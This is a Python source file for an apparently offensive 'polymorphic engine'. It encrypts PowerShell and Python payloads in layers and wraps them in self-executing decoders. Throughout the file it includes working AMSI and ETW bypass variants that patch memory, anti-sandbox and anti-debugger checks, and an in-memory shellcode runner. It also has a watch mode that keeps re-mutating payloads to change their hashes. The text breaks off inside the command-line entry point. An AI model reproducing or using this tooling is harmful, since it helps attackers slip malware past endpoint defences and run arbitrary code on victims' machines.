#!/usr/bin/env python3
"""
WiZZA Polymorphic Engine  — core mutation library
===================================================
Used by obfuscate_ps1.py, obfuscate_py.py, and start poly.

Features:
  ● Multi-layer encoding (XOR, RC4, AES-CTR-sim, base64 — stacked N times)
  ● 8 string mutation techniques per language
  ● Control-flow flattening (dispatch-loop for PS1)
  ● Dead-code injection (plausible-looking no-ops)
  ● Template pooling — pick random equivalent for each construct
  ● Batch mutation — mutate a list of files in one call
  ● Watch mode — re-mutate on schedule (used by start poly watch)
  ● Hash report — print SHA256 before/after

Usage (library):
    from poly_engine import PolyEngine, Lang
    pe = PolyEngine(rounds=3)
    out = pe.mutate_ps1(source_code)
    out = pe.mutate_py(source_code)

Usage (CLI):
    python3 poly_engine.py --lang ps1  --in payload.ps1  --out evaded.ps1 --rounds 3
    python3 poly_engine.py --lang py   --in agent.py     --out evaded.py
    python3 poly_engine.py --lang all  --dir ~/.wizza/payloads/  --rounds 2
    python3 poly_engine.py --watch     --dir ~/.wizza/payloads/  --interval 300
"""

from __future__ import annotations
import argparse, base64, hashlib, marshal, os, random, re
import string, struct, sys, time, zlib
from enum import Enum
from typing import Callable, Optional

# ── Language enum ──────────────────────────────────────────────────────
class Lang(Enum):
    PS1  = "ps1"
    PY   = "py"
    AUTO = "auto"

# ── Random name helpers ────────────────────────────────────────────────
class _Names:
    _used: set[str] = set()

    @classmethod
    def reset(cls):
        cls._used.clear()

    @classmethod
    def get(cls, n=8) -> str:
        styles = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=n)),
            lambda: '_' + ''.join(random.choices(string.ascii_lowercase, k=n-1)),
            lambda: ''.join(random.choices('lI1', k=2)) + ''.join(random.choices(string.ascii_lowercase, k=n-2)),
        ]
        while True:
            name = random.choice(styles)()
            if name not in cls._used and name.isidentifier():
                cls._used.add(name)
                return name

def rn(n=8):  return _Names.get(n)
def rv():     return "$" + rn(random.randint(5, 10))   # PS1 variable
def pv():     return rn(random.randint(5, 10))           # Python variable
def rf():     return rn(random.randint(6, 12))           # function name

# ══════════════════════════════════════════════════════════════════════
# CIPHER LAYER
# ══════════════════════════════════════════════════════════════════════

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def rc4_bytes(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out, i, j = bytearray(), 0, 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def aes_ctr_sim(data: bytes, key: bytes) -> bytes:
    """AES-CTR approximation using SHA256-based keystream (no deps)."""
    import hashlib
    out = bytearray()
    ctr = 0
    while len(out) < len(data):
        block = hashlib.sha256(key + struct.pack(">Q", ctr)).digest()
        out.extend(block)
        ctr += 1
    return bytes(a ^ b for a, b in zip(data, out[:len(data)]))

CIPHERS = [xor_bytes, rc4_bytes, aes_ctr_sim]
CIPHER_NAMES = ["XOR", "RC4", "AES-CTR-sim"]

def multi_layer_encode(data: bytes, rounds: int) -> tuple[bytes, list[tuple[str,bytes]]]:
    """Encode data through `rounds` random cipher layers. Returns (encoded, layers)."""
    layers: list[tuple[str, bytes]] = []
    cur = data
    for _ in range(rounds):
        cipher_fn = random.choice(CIPHERS)
        key_len = random.randint(8, 32)
        key = bytes(random.randint(1, 254) for _ in range(key_len))
        cur = cipher_fn(cur, key)
        cur = zlib.compress(cur, 9)
        layers.append((cipher_fn.__name__, key))
    return base64.b64encode(cur), layers

# ══════════════════════════════════════════════════════════════════════
# STRING MUTATION — PowerShell
# ══════════════════════════════════════════════════════════════════════

def ps1_split(s: str) -> str:
    """Split into concatenated quoted chunks."""
    parts, i = [], 0
    while i < len(s):
        n = random.randint(1, min(4, len(s) - i))
        parts.append(f'"{s[i:i+n]}"')
        i += n
    return "+".join(parts)

def ps1_chararray(s: str) -> str:
    return "(" + "+".join(f"[char]{ord(c)}" for c in s) + ")"

def ps1_b64(s: str) -> str:
    b = base64.b64encode(s.encode()).decode()
    v = rv()
    return f"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String({ps1_split(b)})))"

def ps1_reverse(s: str) -> str:
    rev = s[::-1]
    return f"(-join {ps1_split(rev)}[-1..-{len(rev)}])"

def ps1_hex(s: str) -> str:
    hexstr = ''.join(f'\\x{ord(c):02x}' for c in s)
    return f'"{hexstr}"'

def ps1_decimal(s: str) -> str:
    nums = ",".join(str(ord(c)) for c in s)
    return f"([string]::join('',({nums})|%{{[char]$_}}))"

def ps1_env_concat(s: str) -> str:
    """Hide string by XOR-encoding and decoding inline."""
    key = random.randint(1, 127)
    enc = [ord(c) ^ key for c in s]
    nums = ",".join(str(b) for b in enc)
    kv = rv()
    return f"(-join (({nums})|%{{[char]($_ -bxor {key})}} ))"

def ps1_obf(s: str) -> str:
    fn = random.choice([ps1_split, ps1_chararray, ps1_b64, ps1_reverse,
                        ps1_hex, ps1_decimal, ps1_env_concat])
    try:
        return fn(s)
    except Exception:
        return f'"{s}"'

# ══════════════════════════════════════════════════════════════════════
# STRING MUTATION — Python
# ══════════════════════════════════════════════════════════════════════

def py_split(s: str) -> str:
    parts, i = [], 0
    while i < len(s):
        n = random.randint(1, min(4, len(s) - i))
        parts.append(repr(s[i:i+n]))
        i += n
    return "+".join(parts)

def py_b64(s: str) -> str:
    b = base64.b64encode(s.encode()).decode()
    return f"__import__('base64').b64decode({repr(b)}).decode()"

def py_bytes_join(s: str) -> str:
    nums = ",".join(str(ord(c)) for c in s)
    return f"bytes([{nums}]).decode()"

def py_xor_inline(s: str) -> str:
    key = random.randint(1, 127)
    enc = [ord(c) ^ key for c in s]
    nums = ",".join(str(b) for b in enc)
    return f"''.join(chr(b^{key}) for b in [{nums}])"

def py_reverse(s: str) -> str:
    return repr(s[::-1]) + "[::-1]"

def py_hex_str(s: str) -> str:
    return repr(bytes(ord(c) for c in s).hex()) + ".encode('latin-1').decode()"

def py_obf(s: str) -> str:
    fn = random.choice([py_split, py_b64, py_bytes_join, py_xor_inline, py_reverse])
    try:
        return fn(s)
    except Exception:
        return repr(s)

# ══════════════════════════════════════════════════════════════════════
# PS1 DEAD CODE
# ══════════════════════════════════════════════════════════════════════

def ps1_dead(n=4) -> str:
    lines = []
    for _ in range(n):
        v = rv()
        t = random.choice(["int","str","arr","if","try"])
        if t == "int":
            lines.append(f"{v} = {random.randint(1,9999)}")
        elif t == "str":
            s = ''.join(random.choices(string.ascii_letters, k=random.randint(4,12)))
            lines.append(f"{v} = {ps1_obf(s)}")
        elif t == "arr":
            nums = ",".join(str(random.randint(1,255)) for _ in range(random.randint(2,6)))
            lines.append(f"{v} = @({nums})")
        elif t == "if":
            lines.append(f"if ($false) {{ {v} = {random.randint(0,9999)} }}")
        else:
            s = ''.join(random.choices(string.ascii_letters, k=8))
            lines.append(f"try {{ {v} = {ps1_obf(s)} }} catch {{ }}")
    return "\n".join(lines)

# ══════════════════════════════════════════════════════════════════════
# PS1 CONTROL FLOW FLATTENING
# ══════════════════════════════════════════════════════════════════════

def ps1_flatten(code_blocks: list[str]) -> str:
    """Wrap code blocks in a dispatch-loop that jumps by state variable."""
    sv = rv()      # state variable
    order = list(range(len(code_blocks)))
    random.shuffle(order)
    # Build a permuted dispatch mapping: real_order[i] → shuffled label
    label_map = {real: shuffled for shuffled, real in enumerate(order)}
    cases = []
    for real_idx, block in enumerate(code_blocks):
        label = label_map[real_idx]
        next_label = label_map.get(real_idx + 1, len(code_blocks))
        cases.append(
            f"    {label} {{\n"
            f"        {block.strip()}\n"
            f"        {sv} = {next_label}\n"
            f"    }}"
        )
    cases_str = "\n".join(cases)
    init_label = label_map[0]
    return f"""
{sv} = {init_label}
while ({sv} -lt {len(code_blocks)}) {{
  switch ({sv}) {{
{cases_str}
  }}
}}
"""

# ══════════════════════════════════════════════════════════════════════
# PS1 AMSI/ETW BYPASS POOL (expanded to 5 variants each)
# ══════════════════════════════════════════════════════════════════════

def ps1_amsi_pool() -> list[Callable[[], str]]:
    return [
        # V1: AmsiUtils field null via reflection
        lambda: f"""
{rv()} = [Ref].Assembly.GetTypes()
{rv()} = ${_Names.get()} | Where-Object {{ $_.Name -like {ps1_obf('*AmsiUtils*')} }}
{rv()} = ${_Names.get()}.GetFields('NonPublic,Static' -split ',')
{rv()} = ${_Names.get()} | Where-Object {{ $_.Name -like {ps1_obf('*Context*')} }}
[IntPtr]{rv()} = ${_Names.get()}.GetValue($null)
[System.Runtime.InteropServices.Marshal]::Copy(
  [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, ${_Names.get()}, 6)
""",
        # V2: P/Invoke VirtualProtect patch
        lambda: f"""
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class _{rn()}{{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr p,IntPtr a,byte[] d,int n,out int w);
}}
"@
{rv()} = [_{rn()}]::LoadLibrary({ps1_obf('amsi.dll')})
{rv()} = [_{rn()}]::GetProcAddress(${_Names.get()},{ps1_obf('AmsiScanBuffer')})
{rv()} = [uint32]0
[_{rn()}]::VirtualProtect(${_Names.get()},[uint32]6,0x40,[ref]${_Names.get()})|Out-Null
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,${_Names.get()},6)
""",
        # V3: ScriptBlock signature cache clear
        lambda: f"""
{rv()} = [ScriptBlock].GetField({ps1_obf('signatures')},'NonPublic,Static' -as [Reflection.BindingFlags])
${_Names.get()}.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
$env:PSExecutionPolicyPreference={ps1_obf('Bypass')}
""",
        # V4: CLR JITCOMPILER patch (AmsiScanString)
        lambda: f"""
{rv()} = [Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
{rv()} = [IO.Path]::Combine(${_Names.get()}, {ps1_obf('clrjit.dll')})
[Reflection.Assembly]::LoadFile(${_Names.get()}) | Out-Null
{rv()} = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {{ $_.Location -match {ps1_obf('amsi')} }}
if (${_Names.get()}) {{
  {rv()} = ${_Names.get()}.GetType({ps1_obf('AmsiUtils')}, $true)
  ${_Names.get()}.GetFields('NonPublic,Static')|Where-Object{{$_.Name -match {ps1_obf('s_amsiContext')}}}|ForEach-Object{{ $_.SetValue($null,[IntPtr]::Zero) }}
}}
""",
        # V5: WriteProcessMemory self-patch
        lambda: f"""
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class _{rn()}{{
[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern IntPtr OpenProcess(int a,bool i,int p);
[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr p,IntPtr b,byte[] d,int n,ref int w);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
}}
"@
{rv()} = [_{rn()}]::GetModuleHandle({ps1_obf('amsi.dll')})
{rv()} = [_{rn()}]::GetProcAddress(${_Names.get()},{ps1_obf('AmsiScanBuffer')})
{rv()} = 0
[_{rn()}]::VirtualProtect(${_Names.get()},[uint32]6,0x40,[ref]${_Names.get()})|Out-Null
{rv()} = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_Names.get()},0,${_Names.get()},6)
""",
    ]

def ps1_etw_pool() -> list[Callable[[], str]]:
    return [
        # V1: NtTraceEvent ret patch
        lambda: f"""
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class _{rn()}{{
[DllImport("ntdll")]public static extern int EtwEventWrite(IntPtr h,IntPtr d,int c,IntPtr p);
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
}}
"@
{rv()} = [_{rn()}]::GetModuleHandle({ps1_obf('ntdll.dll')})
{rv()} = [_{rn()}]::GetProcAddress(${_Names.get()},{ps1_obf('EtwEventWrite')})
{rv()} = 0
[_{rn()}]::VirtualProtect(${_Names.get()},[uint32]1,0x40,[ref]${_Names.get()})|Out-Null
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xC3),0,${_Names.get()},1)
""",
        # V2: Reflection-based ETW provider disable
        lambda: f"""
{rv()} = [Diagnostics.Eventing.EventProvider].GetField({ps1_obf('m_enabled')},'NonPublic,Instance')
[AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {{
  $_.GetTypes() | Where-Object {{ $_.Name -match {ps1_obf('EventProvider')} }} |
  ForEach-Object {{
    {rv()} = $_ | Get-Member -Static -Name {ps1_obf('m_singleton')} -ErrorAction SilentlyContinue
    if (${_Names.get()}) {{ ${_Names.get()}.GetValue($null) | ForEach-Object {{ ${_Names.get()}.SetValue($_, 0) }} }}
  }}
}}
""",
    ]

# ══════════════════════════════════════════════════════════════════════
# PS1 ANTI-SANDBOX POOL
# ══════════════════════════════════════════════════════════════════════

def ps1_sandbox_pool() -> list[Callable[[], str]]:
    return [
        lambda: f"""
{rv()} = (Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
if (${_Names.get()}.TotalMinutes -lt {random.randint(6,15)}) {{ exit }}
{rv()} = (Get-WmiObject Win32_DesktopMonitor).ScreenWidth
if (-not ${_Names.get()} -or ${_Names.get()} -lt 800) {{ exit }}
if ($env:USERNAME -match {ps1_obf('sandbox|virus|malware|test|vmware|vbox|analyze|cuckoo')}) {{ exit }}
if ((Get-Process).Count -lt {random.randint(18,35)}) {{ exit }}
""",
        lambda: f"""
{rv()} = (Get-ItemProperty 'HKLM:\\HARDWARE\\DESCRIPTION\\System' -ErrorAction SilentlyContinue).SystemBiosVersion
if (${_Names.get()} -match {ps1_obf('VBOX|VMWARE|QEMU|BOCHS|INNOTEK')}) {{ exit }}
{rv()} = (Get-WmiObject -Class Win32_BIOS).Manufacturer
if (${_Names.get()} -match {ps1_obf('VMware|VirtualBox|QEMU|Xen')}) {{ exit }}
if ((Get-Process | Measure-Object).Count -lt {random.randint(15,30)}) {{ exit }}
""",
        lambda: f"""
{rv()} = [System.Diagnostics.Process]::GetProcesses() | Where-Object {{ $_.ProcessName -match {ps1_obf('vmtoolsd|vboxservice|wireshark|procmon|x64dbg|ollydbg|ida')} }}
if (${_Names.get()}) {{ exit }}
{rv()} = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
if (${_Names.get()} -lt {random.randint(2,4)}GB) {{ exit }}
""",
    ]

# ══════════════════════════════════════════════════════════════════════
# PYTHON DEAD CODE
# ══════════════════════════════════════════════════════════════════════

def py_dead(n=4) -> str:
    lines = []
    for _ in range(n):
        v = pv()
        t = random.choice(["int","str","list","lambda","if"])
        if t == "int":
            lines.append(f"_{v} = {random.randint(1,99999)}")
        elif t == "str":
            s = ''.join(random.choices(string.ascii_letters, k=random.randint(4,12)))
            lines.append(f"_{v} = {py_obf(s)}")
        elif t == "list":
            nums = ",".join(str(random.randint(0,255)) for _ in range(random.randint(2,8)))
            lines.append(f"_{v} = [{nums}]")
        elif t == "lambda":
            lines.append(f"_{v} = lambda _x: _x ^ {random.randint(1,255)}")
        else:
            lines.append(f"if False: _{v} = {random.randint(0,9999)}")
    return "\n".join(lines)

# ══════════════════════════════════════════════════════════════════════
# POLY ENGINE CLASS
# ══════════════════════════════════════════════════════════════════════

class PolyEngine:
    def __init__(self, rounds: int = 3, flatten: bool = True,
                 dead_blocks: int = 4, sandbox: bool = True):
        self.rounds = rounds
        self.flatten = flatten
        self.dead_blocks = dead_blocks
        self.sandbox = sandbox

    # ── PS1 mutation ──────────────────────────────────────────────────
    def mutate_ps1(self, source: str) -> str:
        _Names.reset()

        # Encode payload through N cipher layers
        encoded_b64, layers = multi_layer_encode(source.encode(), self.rounds)
        encoded_str = encoded_b64.decode()

        # Build runtime decoder in PS1
        # Apply layers in REVERSE order, each with its own cipher
        decoders = []
        cur_var = rv()
        decoders.append(f"{cur_var} = {ps1_obf(encoded_str)}")
        decoders.append(f"{cur_var} = [System.Convert]::FromBase64String({cur_var})")

        for cipher_name, key in reversed(layers):
            key_b64 = base64.b64encode(key).decode()
            tmp_var = rv()
            key_var = rv()
            decoders.append(f"{key_var} = [System.Convert]::FromBase64String({ps1_obf(key_b64)})")
            # decompress first (we compressed after each cipher)
            decomp_var = rv()
            decoders.append(f"{decomp_var} = New-Object System.IO.MemoryStream(,{cur_var})")
            decoders.append(f"{tmp_var} = New-Object System.IO.Compression.GZipStream({decomp_var},[System.IO.Compression.CompressionMode]::Decompress)")
            result_var = rv()
            decoders.append(f"{result_var} = New-Object System.IO.MemoryStream")
            decoders.append(f"{tmp_var}.CopyTo({result_var})")
            decoders.append(f"{cur_var} = {result_var}.ToArray()")

            if cipher_name == "xor_bytes":
                idx_var = rv()
                decoders.append(
                    f"{cur_var} = 0..({cur_var}.Length-1) | ForEach-Object {{ {cur_var}[$_] -bxor {key_var}[$_ % {key_var}.Length] }}"
                )
            elif cipher_name == "rc4_bytes":
                rc4_cls = rn(10)
                decoders.append(f"""
Add-Type -TypeDefinition @"
using System;public class {rc4_cls}{{
public static byte[] Dec(byte[] d,byte[] k){{
var S=new byte[256];byte t;int i,j=0;
for(i=0;i<256;i++)S[i]=(byte)i;
for(i=0;i<256;i++){{j=(j+S[i]+k[i%k.Length])%256;t=S[i];S[i]=S[j];S[j]=t;}}
var r=new byte[d.Length];i=j=0;
for(int x=0;x<d.Length;x++){{i=(i+1)%256;j=(j+S[i])%256;t=S[i];S[i]=S[j];S[j]=t;r[x]=(byte)(d[x]^S[(S[i]+S[j])%256]);}}
return r;}}}}
"@
{cur_var} = [{rc4_cls}]::Dec({cur_var},{key_var})
""")
            else:  # aes_ctr_sim — just XOR with SHA256 keystream
                aes_cls = rn(10)
                decoders.append(f"""
Add-Type -TypeDefinition @"
using System;using System.Security.Cryptography;
public class {aes_cls}{{
public static byte[] Dec(byte[] d,byte[] k){{
var r=new byte[d.Length];int pos=0;ulong ctr=0;
while(pos<d.Length){{
var h=SHA256.Create();h.TransformBlock(k,0,k.Length,null,0);
var cb=BitConverter.GetBytes(ctr);Array.Reverse(cb);h.TransformFinalBlock(cb,0,8);
var b=h.Hash;
for(int i=0;i<b.Length&&pos<d.Length;i++,pos++)r[pos]=(byte)(d[pos]^b[i]);
ctr++;}}return r;}}}}
"@
{cur_var} = [{aes_cls}]::Dec({cur_var},{key_var})
""")

        # Final: convert bytes to string and execute
        src_var = rv()
        exec_var = rv()
        decoders.append(f"{src_var} = [System.Text.Encoding]::UTF8.GetString({cur_var})")
        decoders.append(f"{exec_var} = [ScriptBlock]::Create({src_var})")
        decoders.append(f"& {exec_var}")

        # Pick random AMSI + ETW + sandbox bypasses
        amsi_fn = random.choice(ps1_amsi_pool())
        etw_fn  = random.choice(ps1_etw_pool())
        amsi    = amsi_fn()
        etw     = etw_fn()
        sandbox = ""
        if self.sandbox:
            sandbox = random.choice(ps1_sandbox_pool())()

        blocks = [
            ps1_dead(self.dead_blocks),
            sandbox,
            amsi,
            ps1_dead(self.dead_blocks // 2),
            etw,
            ps1_dead(self.dead_blocks // 2),
            "\n".join(decoders),
        ]

        if self.flatten:
            # Flatten all but the exec block to resist static analysis
            body = ps1_flatten(blocks)
        else:
            body = "\n".join(blocks)

        header = f"# {rn(16)}\nSet-StrictMode -Off\n$ErrorActionPreference = {ps1_obf('SilentlyContinue')}\n$ProgressPreference = {ps1_obf('SilentlyContinue')}\n"
        return header + body

    # ── Python mutation ───────────────────────────────────────────────
    def mutate_py(self, source: str) -> str:
        _Names.reset()

        # Compile → marshal → zlib → multi-layer cipher
        code_obj = compile(source, "<poly>", "exec")
        raw = marshal.dumps(code_obj)
        raw_z = zlib.compress(raw, 9)

        encoded_b64, layers = multi_layer_encode(raw_z, self.rounds)
        payload_b64 = encoded_b64.decode()

        # Build decoder
        b64mod = pv(); zlibmod = pv(); marshalmod = pv()
        sysMod = pv(); hlib = pv(); structmod = pv()
        cur_var = pv()
        lines = [
            f"import base64 as _{b64mod}, zlib as _{zlibmod}, marshal as _{marshalmod}, sys as _{sysMod}, os as _os, socket as _sk, time as _tm, struct as _{structmod}, hashlib as _{hlib}",
            py_dead(self.dead_blocks),
        ]

        # Anti-sandbox
        if self.sandbox:
            sb_fn = pv(); os_v = "_os"; tm_v = f"_{sysMod}"; sk_v = "_sk"
            lines.append(f"""
def _{sb_fn}():
    try:
        _up=float((_os.popen({py_obf('cat /proc/uptime 2>/dev/null || echo 999')}).read() or '999').split()[0])
        if _up<{random.randint(200,400)}: _{sysMod}.exit(0)
    except: pass
    try:
        _hn=_sk.gethostname().lower()
        for _bw in [{','.join(repr(w) for w in ['sandbox','virus','malware','vbox','vmware','cuckoo','analysis','any.run'])}]:
            if _bw in _hn: _{sysMod}.exit(0)
    except: pass
    try:
        _un=(_os.environ.get('USER','') or _os.environ.get('USERNAME','')).lower()
        if _un in [{','.join(repr(w) for w in ['sandbox','virus','malware','test','admin'])}]: _{sysMod}.exit(0)
    except: pass
_{sb_fn}()
""")

        lines.append(py_dead(self.dead_blocks // 2))

        # Layered decoder
        lines.append(f"_{cur_var} = _{b64mod}.b64decode({py_obf(payload_b64)})")

        for cipher_name, key in reversed(layers):
            key_b64 = base64.b64encode(key).decode()
            key_var = pv()
            tmp_var = pv()
            lines.append(f"_{key_var} = _{b64mod}.b64decode({py_obf(key_b64)})")
            # Decompress
            lines.append(f"_{tmp_var} = _{zlibmod}.decompress(_{cur_var})")
            # Decipher
            nxt_var = pv()
            if cipher_name == "xor_bytes":
                lines.append(f"_{nxt_var} = bytes(_{tmp_var}[_i] ^ _{key_var}[_i % len(_{key_var})] for _i in range(len(_{tmp_var})))")
            elif cipher_name == "rc4_bytes":
                rc4_fn = pv()
                lines.append(f"""
def _{rc4_fn}(_d,_k):
    _S=list(range(256));_j=0
    for _i in range(256):_j=(_j+_S[_i]+_k[_i%len(_k)])%256;_S[_i],_S[_j]=_S[_j],_S[_i]
    _o=bytearray();_i=_j=0
    for _b in _d:_i=(_i+1)%256;_j=(_j+_S[_i])%256;_S[_i],_S[_j]=_S[_j],_S[_i];_o.append(_b^_S[(_S[_i]+_S[_j])%256])
    return bytes(_o)
""")
                lines.append(f"_{nxt_var} = _{rc4_fn}(_{tmp_var}, _{key_var})")
            else:  # aes_ctr_sim
                ctr_fn = pv()
                lines.append(f"""
def _{ctr_fn}(_d,_k):
    import hashlib as _hh,struct as _ss
    _o=bytearray();_c=0;_pos=0
    while _pos<len(_d):
        _blk=_hh.sha256(_k+_ss.pack('>Q',_c)).digest()
        for _b in _blk:
            if _pos>=len(_d): break
            _o.append(_d[_pos]^_b);_pos+=1
        _c+=1
    return bytes(_o)
""")
                lines.append(f"_{nxt_var} = _{ctr_fn}(_{tmp_var}, _{key_var})")

            lines.append(py_dead(1))
            cur_var = nxt_var

        # Decompress the original zlib wrap and execute
        final_var = pv()
        lines.append(f"_{final_var} = _{zlibmod}.decompress(_{cur_var})")
        lines.append(f"exec(_{marshalmod}.loads(_{final_var}))")

        return "# -*- coding: utf-8 -*-\n" + "\n".join(lines)

    # ── Shellcode wrapper ─────────────────────────────────────────────
    def mutate_shellcode_ps1(self, shellcode_hex: str) -> str:
        """Generate a PS1 shellcode runner with polymorphic decoder stub."""
        _Names.reset()
        sc_bytes = bytes.fromhex(shellcode_hex.replace(" ","").replace("\\x",""))
        encoded_b64, layers = multi_layer_encode(sc_bytes, self.rounds)
        encoded_str = encoded_b64.decode()

        # Build decoder
        cur_var = rv(); key_var = rv(); tmp_var = rv()
        decode_lines = [
            f"{cur_var} = [System.Convert]::FromBase64String({ps1_obf(encoded_str)})",
        ]
        for cipher_name, key in reversed(layers):
            key_b64 = base64.b64encode(key).decode()
            decode_lines.append(f"{key_var} = [System.Convert]::FromBase64String({ps1_obf(key_b64)})")
            # GZip decompress
            ms_var = rv(); gs_var = rv(); out_var = rv()
            decode_lines.append(f"{ms_var} = New-Object System.IO.MemoryStream(,{cur_var})")
            decode_lines.append(f"{gs_var} = New-Object System.IO.Compression.GZipStream({ms_var},[System.IO.Compression.CompressionMode]::Decompress)")
            decode_lines.append(f"{out_var} = New-Object System.IO.MemoryStream; {gs_var}.CopyTo({out_var})")
            decode_lines.append(f"{cur_var} = {out_var}.ToArray()")
            if cipher_name == "xor_bytes":
                decode_lines.append(f"{cur_var} = 0..({cur_var}.Length-1) | ForEach-Object {{ {cur_var}[$_] -bxor {key_var}[$_ % {key_var}.Length] }}")
            elif cipher_name == "rc4_bytes":
                rc4c = rn(8)
                decode_lines.append(f"""
Add-Type -TypeDefinition @"
using System;public class {rc4c}{{public static byte[] D(byte[] d,byte[] k){{
var S=new byte[256];byte t;int i,j=0;for(i=0;i<256;i++)S[i]=(byte)i;
for(i=0;i<256;i++){{j=(j+S[i]+k[i%k.Length])%256;t=S[i];S[i]=S[j];S[j]=t;}}
var r=new byte[d.Length];i=j=0;for(int x=0;x<d.Length;x++){{i=(i+1)%256;j=(j+S[i])%256;t=S[i];S[i]=S[j];S[j]=t;r[x]=(byte)(d[x]^S[(S[i]+S[j])%256]);}}return r;}}}}
"@
{cur_var} = [{rc4c}]::D({cur_var},{key_var})""")

        # Inject shellcode into current process
        alloc_cls = rn(8)
        ptr_var = rv(); cb_var = rv(); th_var = rv()
        decode_lines.append(f"""
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class {alloc_cls}{{
[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);
[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);
}}
"@
{ptr_var} = [{alloc_cls}]::VirtualAlloc(0,[uint]{len(sc_bytes)},0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy({cur_var},0,{ptr_var},{len(sc_bytes)})
{th_var} = [{alloc_cls}]::CreateThread(0,0,{ptr_var},0,0,0)
[{alloc_cls}]::WaitForSingleObject({th_var}, 0xFFFFFFFF)
""")

        amsi = random.choice(ps1_amsi_pool())()
        etw  = random.choice(ps1_etw_pool())()
        body = f"# {rn(16)}\nSet-StrictMode -Off\n$ErrorActionPreference = {ps1_obf('SilentlyContinue')}\n"
        body += ps1_dead(self.dead_blocks) + "\n"
        body += amsi + "\n"
        body += etw  + "\n"
        body += ps1_dead(2) + "\n"
        body += "\n".join(decode_lines)
        return body

# ══════════════════════════════════════════════════════════════════════
# BATCH MUTATION
# ══════════════════════════════════════════════════════════════════════

def batch_mutate(directory: str, rounds: int = 2, langs: list[Lang] = None):
    """Mutate all supported payload files in a directory."""
    if langs is None:
        langs = [Lang.PS1, Lang.PY]
    pe = PolyEngine(rounds=rounds)
    count = 0
    for fname in os.listdir(directory):
        fpath = os.path.join(directory, fname)
        if not os.path.isfile(fpath): continue
        ext = os.path.splitext(fname)[1].lower()
        try:
            if ext == ".ps1" and Lang.PS1 in langs:
                with open(fpath) as f: src = f.read()
                out = pe.mutate_ps1(src)
                with open(fpath, "w") as f: f.write(out)
                print(f"  [~] PS1  mutated: {fname}")
                count += 1
            elif ext == ".py" and Lang.PY in langs:
                with open(fpath) as f: src = f.read()
                try: compile(src, fpath, "exec")
                except SyntaxError: continue
                out = pe.mutate_py(src)
                with open(fpath, "w") as f: f.write(out)
                print(f"  [~] PY   mutated: {fname}")
                count += 1
        except Exception as e:
            print(f"  [!] {fname}: {e}")
    return count

def sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f: h.update(f.read())
    return h.hexdigest()[:16]

# ══════════════════════════════════════════════════════════════════════
# WATCH MODE
# ══════════════════════════════════════════════════════════════════════

def watch_mode(directory: str, interval: int, rounds: int = 2):
    """Re-mutate all payloads every `interval` seconds."""
    print(f"  [*] Watch mode: mutating {directory} every {interval}s")
    print(f"  [*] Press Ctrl+C to stop")
    cycle = 0
    while True:
        cycle += 1
        print(f"\n  [{time.strftime('%H:%M:%S')}] Cycle {cycle} — mutating payloads...")
        n = batch_mutate(directory, rounds=rounds)
        print(f"  [+] {n} file(s) mutated — each now has a unique hash")
        time.sleep(interval)

# ══════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(description="WiZZA Polymorphic Engine")
    ap.add_argument("--lang",     choices=["ps1","py","shell","all"], default="ps1")
    ap.add_argument("--in",  "-i", dest="infile",  help="Input file")
    ap.add_argument("--out", "-o", dest="outfile", help="Output file")
    ap.add_argument("--dir",       help="Directory for batch/watch mode")
    ap.add_argument("--rounds",    type=int, default=3, help="Cipher rounds (default 3)")
    ap.add_argument("--no-flatten",action="store_true", help="Skip control-flow flattening")
    ap.add_argument("--no-sandbox",action="store_true", help="Skip anti-sandbox checks")
    ap.add_argument("--watch",     action="store_true", help="Watch+auto-remutate mode")
    ap.add_argument("--interval",  type=int, default=300, help="Watch interval seconds (default 300)")
    args = ap.parse_args()

    if args.watch:
